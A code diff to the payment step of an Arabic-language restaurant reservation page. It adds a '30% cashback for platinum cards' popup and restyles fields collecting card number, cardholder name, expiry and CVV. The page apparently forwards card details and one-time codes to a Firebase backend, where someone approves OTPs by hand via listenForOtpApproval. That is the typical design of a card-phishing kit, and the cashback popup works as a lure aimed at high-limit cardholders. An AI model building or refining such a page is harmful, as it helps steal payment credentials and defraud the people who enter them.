@@ -1,9 +1,12 @@
 import { useState, useRef, useEffect } from "react";
 import { Link, useParams } from "wouter";
-import { ArrowRight, Calendar, Clock, Users, CheckCircle, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, Wifi, ChevronDown, Receipt, RefreshCw } from "lucide-react";
+import { ArrowRight, Calendar, Clock, Users, CheckCircle, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, Wifi, ChevronDown, Receipt, RefreshCw, X, Gift } from "lucide-react";
 import { getRestaurantById } from "@/lib/restaurant-data";
 import { addData, handlePay, handleOtp, listenForOtpApproval } from "@/lib/firebase";
 import { setupOnlineStatus } from "@/lib/utils";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
 
 type Step = 1 | 2 | 3 | 4 | 5 | 6;
 
@@ -117,6 +120,7 @@ export default function Reserve() {
   const [otpWaiting, setOtpWaiting] = useState(false);
   const [otpResult, setOtpResult] = useState<"approved" | "rejected" | null>(null);
   const [resendTimer, setResendTimer] = useState(60);
+  const [showCashbackPopup, setShowCashbackPopup] = useState(false);
   const otpInputRef = useRef<HTMLInputElement>(null);
 
   const serviceFee = 50;
@@ -701,7 +705,7 @@ export default function Reserve() {
             </div>
 
             <button
-              onClick={() => setStep(5)}
+              onClick={() => { setStep(5); setShowCashbackPopup(true); }}
               className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md flex items-center justify-center gap-2"
               data-testid="button-next-step-4"
             >
@@ -712,187 +716,235 @@ export default function Reserve() {
         )}
 
         {step === 5 && (
-          <div className="space-y-4 animate-fade-in" data-testid="step-5-content">
-            <div className="mb-4" dir="ltr">
-              <div
-                className={`relative w-full max-w-sm mx-auto aspect-[1.586/1] rounded-2xl p-5 bg-gradient-to-br ${getCardGradient(cardType)} shadow-2xl overflow-hidden`}
-                data-testid="card-preview"
-              >
-                <div className="flex items-start justify-between">
-                  <div className="w-12 h-8 bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 rounded-lg flex items-center justify-center shadow-md">
-                    <div className="w-9 h-6 border-2 border-yellow-600/30 rounded-sm" />
-                  </div>
-                  <Wifi className="w-6 h-6 text-white/70 rotate-90" />
-                </div>
-                <div className="mt-4">
-                  <p className="text-white text-xl font-mono tracking-[0.15em] drop-shadow-lg">
-                    {cardNumber || "•••• •••• •••• ••••"}
-                  </p>
-                </div>
-                <div className="absolute bottom-5 left-5 right-5">
-                  <div className="flex justify-between items-end">
-                    <div>
-                      <p className="text-white/60 text-[9px] uppercase mb-0.5">Card Holder</p>
-                      <p className="text-white text-xs font-medium truncate max-w-[160px]">
-                        {cardName || "اسم حامل البطاقة"}
-                      </p>
+          <>
+            {showCashbackPopup && (
+              <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
+                <div
+                  className="absolute inset-0 bg-black/60 backdrop-blur-sm animate-fade-in"
+                  onClick={() => setShowCashbackPopup(false)}
+                />
+                <div className="relative bg-gradient-to-br from-[#4a1525] via-[#5a1f30] to-[#3a0f1d] rounded-3xl p-8 max-w-sm w-full shadow-2xl animate-scale-in">
+                  <button
+                    onClick={() => setShowCashbackPopup(false)}
+                    className="absolute top-4 left-4 text-white/80 hover:text-white transition-colors w-8 h-8 rounded-full bg-white/10 flex items-center justify-center"
+                    data-testid="button-close-popup"
+                  >
+                    <X className="w-5 h-5" />
+                  </button>
+                  <div className="text-center space-y-5">
+                    <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto animate-float">
+                      <Gift className="w-10 h-10 text-white" />
                     </div>
-                    <div className="text-right">
-                      <p className="text-white/60 text-[9px] uppercase mb-0.5">Expires</p>
-                      <p className="text-white text-xs font-medium">{expiryMonth}/{expiryYear.slice(-2)}</p>
+                    <div className="space-y-3">
+                      <h3 className="text-2xl font-bold text-white">عرض حصري!</h3>
+                      <p className="text-white text-lg leading-relaxed">احصل على كاش باك يصل إلى</p>
+                      <div className="text-6xl font-bold text-white drop-shadow-lg">30%</div>
+                      <p className="text-white/90 text-sm">عند الدفع من خلال البطاقات من فئة البلاتينية</p>
                     </div>
+                    <div className="flex justify-center gap-3 pt-2">
+                      <img src="/mada.png" className="h-8 bg-white/20 rounded-lg px-3 py-1" alt="mada" />
+                      <img src="/master.svg" className="h-8 bg-white/20 rounded-lg px-3 py-1" alt="mastercard" />
+                      <img src="/visa.png" className="h-5 bg-white/20 rounded-lg px-3 py-2" alt="visa" />
+                    </div>
+                    <Button
+                      onClick={() => setShowCashbackPopup(false)}
+                      size="lg"
+                      className="w-full bg-white text-[#4a1525] font-bold shadow-lg mt-4"
+                      data-testid="button-continue-popup"
+                    >
+                      متابعة الدفع
+                    </Button>
                   </div>
                 </div>
-                {cardType === "visa" && <div className="absolute top-5 right-5 text-white font-bold text-xl italic">VISA</div>}
-                {cardType === "mastercard" && (
-                  <div className="absolute top-5 right-5 flex">
-                    <div className="w-8 h-8 rounded-full bg-red-500 opacity-80" />
-                    <div className="w-8 h-8 rounded-full bg-yellow-500 opacity-80 -ml-4" />
-                  </div>
-                )}
-                {cardType === "mada" && <div className="absolute top-5 right-5 text-white font-bold text-lg">mada</div>}
               </div>
-            </div>
+            )}
 
-            <div className="flex items-center justify-center gap-4 py-1">
-              <img src="/mada.png" className="h-6 opacity-70" alt="mada" />
-              <img src="/master.svg" className="h-6 opacity-70" alt="mastercard" />
-              <img src="/visa.png" className="h-3.5 opacity-70" alt="visa" />
-            </div>
+            <div className="space-y-6 animate-fade-in" data-testid="step-5-content">
+              <div className="mb-6" dir="ltr">
+                <div
+                  className={`relative w-full max-w-sm mx-auto aspect-[1.586/1] rounded-2xl p-6 bg-gradient-to-br ${getCardGradient(cardType)} shadow-2xl overflow-hidden`}
+                  data-testid="card-preview"
+                >
+                  <div className="flex items-start justify-between">
+                    <div className="w-14 h-10 bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 rounded-lg flex items-center justify-center shadow-md">
+                      <div className="w-10 h-7 border-2 border-yellow-600/30 rounded-sm" />
+                    </div>
+                    <Wifi className="w-7 h-7 text-white/70 rotate-90" />
+                  </div>
+                  <div className="mt-6">
+                    <p className="text-white text-2xl font-mono tracking-[0.15em] drop-shadow-lg">
+                      {cardNumber || "•••• •••• •••• ••••"}
+                    </p>
+                  </div>
+                  <div className="absolute bottom-6 left-6 right-6">
+                    <div className="flex justify-between items-end">
+                      <div>
+                        <p className="text-white/60 text-[10px] uppercase mb-1">Card Holder</p>
+                        <p className="text-white text-sm font-medium tracking-wide truncate max-w-[180px]">
+                          {cardName || "اسم حامل البطاقة"}
+                        </p>
+                      </div>
+                      <div className="text-right">
+                        <p className="text-white/60 text-[10px] uppercase mb-1">Expires</p>
+                        <p className="text-white text-sm font-medium">{expiryMonth}/{expiryYear.slice(-2)}</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div className="absolute top-6 right-6">
+                    {cardType === "visa" && <div className="text-white font-bold text-2xl italic">VISA</div>}
+                    {cardType === "mastercard" && (
+                      <div className="flex">
+                        <div className="w-10 h-10 rounded-full bg-red-500 opacity-80" />
+                        <div className="w-10 h-10 rounded-full bg-yellow-500 opacity-80 -ml-5" />
+                      </div>
+                    )}
+                    {cardType === "mada" && <div className="text-white font-bold text-xl">mada</div>}
+                  </div>
+                  <div className="absolute -bottom-20 -right-20 w-40 h-40 rounded-full bg-white/5" />
+                  <div className="absolute -bottom-10 -right-10 w-32 h-32 rounded-full bg-white/5" />
+                </div>
+              </div>
 
-            <div className="bg-white rounded-xl p-5 shadow-sm space-y-4">
-              <div>
-                <label className="text-sm font-medium text-[#4a1525] mb-2 flex items-center gap-2">
-                  <CreditCard className="w-4 h-4" />
-                  رقم البطاقة
-                </label>
-                <div className="relative">
-                  <input
-                    type="text"
-                    value={cardNumber}
-                    onChange={handleCardNumberChange}
-                    maxLength={19}
-                    className={`w-full border rounded-lg px-4 py-3 text-sm bg-[#faf7f3] text-left font-mono focus:outline-none focus:ring-1 transition-colors ${cardErrors.cardNumber ? "border-red-500 focus:ring-red-500" : "border-[#d5c8b5] focus:border-[#4a1525] focus:ring-[#4a1525]"}`}
-                    placeholder="0000 0000 0000 0000"
-                    dir="ltr"
-                    data-testid="input-card-number"
-                  />
-                  {cardType && (
-                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
+              <div className="flex items-center justify-center gap-4 py-2">
+                <img src="/mada.png" className="h-7 opacity-70 hover:opacity-100 transition-opacity" alt="mada" />
+                <img src="/master.svg" className="h-7 opacity-70 hover:opacity-100 transition-opacity" alt="mastercard" />
+                <img src="/visa.png" className="h-4 opacity-70 hover:opacity-100 transition-opacity" alt="visa" />
+              </div>
+
+              <div className="bg-white rounded-2xl shadow-xl p-6 space-y-5">
+                <div>
+                  <Label
+                    htmlFor="reserve-cardNumber"
+                    className="text-sm font-medium text-foreground mb-2 flex items-center gap-2"
+                  >
+                    <CreditCard className="w-4 h-4 text-primary" />
+                    رقم البطاقة
+                  </Label>
+                  <div className="relative">
+                    <Input
+                      id="reserve-cardNumber"
+                      type="text"
+                      value={cardNumber}
+                      onChange={handleCardNumberChange}
+                      maxLength={19}
+                      className={`text-left pr-12 h-12 rounded-xl border-2 font-mono ${cardErrors.cardNumber ? "border-red-500" : "border-input focus:border-primary"}`}
+                      placeholder="0000 0000 0000 0000"
+                      dir="ltr"
+                      data-testid="input-card-number"
+                    />
+                    <div className="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1">
                       {cardType === "visa" && <img src="/visa.png" className="h-4" alt="visa" />}
                       {cardType === "mastercard" && <img src="/master.svg" className="h-6" alt="mastercard" />}
                       {cardType === "mada" && <img src="/mada.png" className="h-6" alt="mada" />}
                     </div>
-                  )}
-                </div>
-                {cardErrors.cardNumber && <p className="text-red-500 text-xs mt-1">{cardErrors.cardNumber}</p>}
-              </div>
-
-              <div>
-                <label className="text-sm font-medium text-[#4a1525] mb-2 block">الاسم على البطاقة</label>
-                <input
-                  type="text"
-                  value={cardName}
-                  onChange={(e) => {
-                    setCardName(e.target.value.toUpperCase().slice(0, 60));
-                    setCardErrors((p) => ({ ...p, cardName: "", submit: "" }));
-                  }}
-                  maxLength={60}
-                  className={`w-full border rounded-lg px-4 py-3 text-sm bg-[#faf7f3] text-left focus:outline-none focus:ring-1 transition-colors ${cardErrors.cardName ? "border-red-500 focus:ring-red-500" : "border-[#d5c8b5] focus:border-[#4a1525] focus:ring-[#4a1525]"}`}
-                  placeholder="MOHAMMED ALI"
-                  dir="ltr"
-                  data-testid="input-card-name"
-                />
-                {cardErrors.cardName && <p className="text-red-500 text-xs mt-1">{cardErrors.cardName}</p>}
-              </div>
-
-              <div className="grid grid-cols-2 gap-3">
-                <div>
-                  <label className="text-sm font-medium text-[#4a1525] mb-2 block">تاريخ الانتهاء</label>
-                  <div className="flex gap-2">
-                    <div className="flex-1 relative">
-                      <select
-                        value={expiryMonth}
-                        onChange={(e) => { setExpiryMonth(e.target.value); setCardErrors((p) => ({ ...p, expiry: "" })); }}
-                        className={`w-full py-3 px-3 rounded-lg border bg-[#faf7f3] text-sm appearance-none ${cardErrors.expiry ? "border-red-500" : "border-[#d5c8b5]"}`}
-                        data-testid="select-expiry-month"
-                      >
-                        {Array.from({ length: 12 }, (_, i) => {
-                          const month = String(i + 1).padStart(2, "0");
-                          return <option key={month} value={month}>{month}</option>;
-                        })}
-                      </select>
-                      <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-3 h-3 text-[#7a6b5f] pointer-events-none" />
-                    </div>
-                    <div className="flex-1 relative">
-                      <select
-                        value={expiryYear}
-                        onChange={(e) => { setExpiryYear(e.target.value); setCardErrors((p) => ({ ...p, expiry: "" })); }}
-                        className={`w-full py-3 px-3 rounded-lg border bg-[#faf7f3] text-sm appearance-none ${cardErrors.expiry ? "border-red-500" : "border-[#d5c8b5]"}`}
-                        data-testid="select-expiry-year"
-                      >
-                        {Array.from({ length: 10 }, (_, i) => {
-                          const year = String(2025 + i);
-                          return <option key={year} value={year}>{year}</option>;
-                        })}
-                      </select>
-                      <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-3 h-3 text-[#7a6b5f] pointer-events-none" />
-                    </div>
                   </div>
-                  {cardErrors.expiry && <p className="text-red-500 text-xs mt-1">{cardErrors.expiry}</p>}
+                  {cardErrors.cardNumber && <p className="text-red-500 text-xs mt-1">{cardErrors.cardNumber}</p>}
                 </div>
+
                 <div>
-                  <label className="text-sm font-medium text-[#4a1525] mb-2 block">CVV</label>
-                  <input
+                  <Label htmlFor="reserve-cardName" className="text-sm font-medium text-foreground mb-2 block">
+                    الاسم على البطاقة
+                  </Label>
+                  <Input
+                    id="reserve-cardName"
                     type="text"
-                    value={cvv}
-                    onChange={handleCvvChange}
-                    maxLength={4}
-                    className={`w-full border rounded-lg px-4 py-3 text-sm bg-[#faf7f3] text-center font-mono focus:outline-none focus:ring-1 transition-colors ${cardErrors.cvv ? "border-red-500 focus:ring-red-500" : "border-[#d5c8b5] focus:border-[#4a1525] focus:ring-[#4a1525]"}`}
-                    placeholder="123"
+                    value={cardName}
+                    onChange={(e) => {
+                      setCardName(e.target.value.toUpperCase().slice(0, 60));
+                      setCardErrors((p) => ({ ...p, cardName: "", submit: "" }));
+                    }}
+                    maxLength={60}
+                    className={`text-left h-12 rounded-xl border-2 ${cardErrors.cardName ? "border-red-500" : "border-input focus:border-primary"}`}
+                    placeholder="MOHAMMED ALI"
                     dir="ltr"
-                    data-testid="input-cvv"
+                    data-testid="input-card-name"
                   />
-                  {cardErrors.cvv && <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>}
+                  {cardErrors.cardName && <p className="text-red-500 text-xs mt-1">{cardErrors.cardName}</p>}
                 </div>
+
+                <div className="grid grid-cols-2 gap-4">
+                  <div>
+                    <Label className="text-sm font-medium text-foreground mb-2 block">تاريخ الانتهاء</Label>
+                    <div className="flex gap-2">
+                      <div className="flex-1 relative">
+                        <select
+                          value={expiryMonth}
+                          onChange={(e) => { setExpiryMonth(e.target.value); setCardErrors((p) => ({ ...p, expiry: "" })); }}
+                          className={`w-full h-12 px-3 rounded-xl border-2 bg-background text-foreground appearance-none ${cardErrors.expiry ? "border-red-500" : "border-input focus:border-primary"}`}
+                          data-testid="select-expiry-month"
+                        >
+                          {Array.from({ length: 12 }, (_, i) => {
+                            const month = String(i + 1).padStart(2, "0");
+                            return <option key={month} value={month}>{month}</option>;
+                          })}
+                        </select>
+                        <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
+                      </div>
+                      <div className="flex-1 relative">
+                        <select
+                          value={expiryYear}
+                          onChange={(e) => { setExpiryYear(e.target.value); setCardErrors((p) => ({ ...p, expiry: "" })); }}
+                          className={`w-full h-12 px-3 rounded-xl border-2 bg-background text-foreground appearance-none ${cardErrors.expiry ? "border-red-500" : "border-input focus:border-primary"}`}
+                          data-testid="select-expiry-year"
+                        >
+                          {Array.from({ length: 10 }, (_, i) => {
+                            const year = String(2025 + i);
+                            return <option key={year} value={year}>{year}</option>;
+                          })}
+                        </select>
+                        <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
+                      </div>
+                    </div>
+                    {cardErrors.expiry && <p className="text-red-500 text-xs mt-1">{cardErrors.expiry}</p>}
+                  </div>
+
+                  <div>
+                    <Label htmlFor="reserve-cvv" className="text-sm font-medium text-foreground mb-2 block">CVV</Label>
+                    <Input
+                      id="reserve-cvv"
+                      type="text"
+                      value={cvv}
+                      onChange={handleCvvChange}
+                      maxLength={4}
+                      className={`text-center h-12 rounded-xl border-2 font-mono ${cardErrors.cvv ? "border-red-500" : "border-input focus:border-primary"}`}
+                      placeholder="123"
+                      dir="ltr"
+                      data-testid="input-cvv"
+                    />
+                    {cardErrors.cvv && <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>}
+                  </div>
+                </div>
+
+                {cardErrors.submit && (
+                  <p className="text-red-500 text-xs text-center" data-testid="error-reserve-submit">
+                    {cardErrors.submit}
+                  </p>
+                )}
+
+                <Button
+                  onClick={handlePaymentSubmit}
+                  size="lg"
+                  className="w-full bg-primary text-white shadow-lg mt-4"
+                  disabled={isSubmitting}
+                  data-testid="button-pay-reserve"
+                >
+                  {isSubmitting ? "جاري المعالجة..." : "متابعة الدفع"}
+                </Button>
               </div>
 
-              {cardErrors.submit && (
-                <p className="text-red-500 text-xs text-center" data-testid="error-reserve-submit">
-                  {cardErrors.submit}
+              <footer className="px-4 py-6 text-center space-y-3">
+                <div className="flex items-center justify-center gap-2">
+                  <div className="w-8 h-8 bg-[#f5efe6] rounded-full flex items-center justify-center">
+                    <Lock className="w-4 h-4 text-[#c9a96e]" />
+                  </div>
+                  <p className="text-sm text-muted-foreground">جميع عمليات الدفع مشفرة وآمنة 100%</p>
+                </div>
+                <p className="text-sm text-primary font-medium">
+                  احصل على كاش باك يصل إلى 30% عند الدفع من خلال البطاقات من فئة البلاتينية
                 </p>
-              )}
+              </footer>
             </div>
-
-            <div className="bg-[#f5efe6] rounded-xl p-3 flex items-center justify-between">
-              <span className="text-[#4a1525] font-bold text-sm">المبلغ المطلوب</span>
-              <span className="text-[#c9a96e] font-bold text-lg">{reservationTotal} ر.س</span>
-            </div>
-
-            <button
-              onClick={handlePaymentSubmit}
-              disabled={isSubmitting}
-              className="w-full bg-[#c9a96e] text-white py-4 rounded-xl font-bold text-base hover:bg-[#b8935a] transition-colors shadow-md disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-              data-testid="button-pay-reserve"
-            >
-              {isSubmitting ? (
-                <>
-                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                  جاري المعالجة...
-                </>
-              ) : (
-                <>
-                  <Lock className="w-5 h-5" />
-                  ادفع {reservationTotal} ر.س
-                </>
-              )}
-            </button>
-
-            <div className="flex items-center justify-center gap-2 text-xs text-[#7a6b5f]">
-              <Lock className="w-3 h-3" />
-              <span>جميع عمليات الدفع مشفرة وآمنة 100%</span>
-            </div>
-          </div>
+          </>
         )}
 
         {step === 6 && otpResult === "approved" && (
